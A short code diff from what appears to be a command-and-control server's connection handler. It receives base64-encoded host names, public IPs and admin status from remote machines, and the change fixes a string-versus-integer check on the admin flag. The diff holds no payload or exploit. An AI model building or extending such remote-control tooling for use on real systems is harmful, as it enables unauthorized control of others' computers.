@@ -149,7 +149,7 @@ def comm_handler():
                 host_name = base64.b64decode(host_name).decode()
                 public_ip = remote_target.recv(4096).decode()
                 public_ip = base64.b64decode(public_ip).decode()
-                if admin == 1:
+                if admin == "1":
                     admin_value = 'Yes'
                 elif username == 'root':
                     admin_value = 'Yes'
